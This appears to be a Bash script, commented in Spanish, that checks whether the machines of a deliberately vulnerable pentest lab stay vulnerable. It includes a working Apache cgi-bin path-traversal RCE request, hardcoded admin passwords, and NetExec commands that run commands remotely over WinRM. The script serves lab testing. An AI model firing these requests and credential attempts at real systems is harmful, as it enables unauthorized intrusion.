#!/usr/bin/env bash
# audit-vulnerable.sh — auditoría read-only del estado vulnerable del laboratorio.
# No modifica servicios. Usa el túnel SSH 1445/15985 hacia M4 si está disponible.
set -uo pipefail
cd "$(dirname "$0")/../.." || exit 1

echo "== Auditoría de estado vulnerable · $(date -u +%FT%TZ) =="
echo
echo "== M1 =="
./informe/tools/vm.sh m1 '
echo -n "WP="; wp core version --allow-root --path=/var/www/wp
echo -n "PHP="; php -v | head -1
php -i | grep -E "^Thread Safety|^display_errors|^memory_limit" | sed "s/^/  /"
echo -n "Apache="; /usr/local/apache2/bin/httpd -v | head -1
/usr/local/apache2/bin/httpd -V | grep "Server MPM" | sed "s/^/  /"
echo -n "W1_batch_POST="; curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Content-Type: application/json" -d "{}" http://127.0.0.1/wp-json/batch/v1
echo -n "W4_login="; J=$(mktemp); curl -s -c "$J" http://127.0.0.1/wp-login.php -o /dev/null; curl -s -b "$J" -c "$J" -o /dev/null -w "%{http_code}\n" -d "log=usc.admin&pwd=Admin13.-&wp-submit=Log+In&testcookie=1" http://127.0.0.1/wp-login.php; rm -f "$J"
echo -n "W5="; curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1/server-status
echo -n "W6="; curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1/info.php
echo -n "W7="; curl -s http://127.0.0.1/wp-content/uploads/ | grep -o "Index of[^<]*" | head -1
echo -n "W3_RCE="; curl -s --path-as-is -X POST "http://127.0.0.1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id" | head -1
echo -n "posts="; wp eval "echo wp_count_posts()->publish;" --allow-root --path=/var/www/wp 2>/dev/null; echo
echo -n "sudo="; echo "Admin13.-" | sudo -S id 2>/dev/null
'
echo
echo "== M2 =="
./informe/tools/vm.sh m2 '
redis-server --version
echo -n "PING="; redis-cli PING
echo -n "requirepass="; redis-cli CONFIG GET requirepass | tail -1
mysql --version
ss -lnt | grep -E ":3306|:6379" | sed "s/^/  /"
'
echo
echo "== M3 =="
./informe/tools/vm.sh m3 '
/usr/local/samba/sbin/smbd --version
(printf "" | nc -w 2 127.0.0.1 21 | head -1)
grep -v "^#" /etc/exports
(printf "" | nc -w 2 127.0.0.1 22 | head -1)
'
echo
echo "== M4 (por túnel) =="
if ss -lnt 2>/dev/null | grep -q 1445; then
  nxc smb 127.0.0.1 --port 1445 2>/dev/null | tail -1
  nxc smb 127.0.0.1 --port 1445 -u Administrador -p 'password_2026' 2>/dev/null | tail -1
  nxc smb 127.0.0.1 --port 1445 -u soporte -p 'Soporte123!' 2>/dev/null | tail -1
  nxc winrm 127.0.0.1 --port 15985 -u Administrador -p 'password_2026' -X 'Get-LocalUser | Select-Object -ExpandProperty Name; (Get-Service Spooler).Status; (Get-SmbServerConfiguration).EnableSMB1Protocol; (Get-SmbServerConfiguration).RequireSecuritySignature' 2>/dev/null | tail -7
  nxc winrm 127.0.0.1 --port 15985 -u Administrador -p 'password_2026' -x 'net localgroup Administradores' 2>/dev/null | grep -E "Administrador|soporte" | tail -2
  dig +time=3 +tries=1 axfr uni.lab @10.10.10.14 2>&1 | grep -E "XFR size|Transfer failed" | head -1
else
  echo "túnel 1445/15985 no disponible"
fi
echo
echo "== M5 =="
nmap -sn -PR 10.10.10.15 2>&1 | grep -E "Nmap scan report|MAC Address" || echo "M5 no responde a ARP"
nmap -Pn -T4 --host-timeout 10s -p445,3389,5900,5985 10.10.10.15 2>&1 | grep -E "Host is up|^[0-9]+/tcp" || echo "M5 sin puertos accesibles"
echo
echo "== M6 =="
ss -lnt 2>/dev/null | grep 2121 || echo "FTP 2121 no está escuchando"
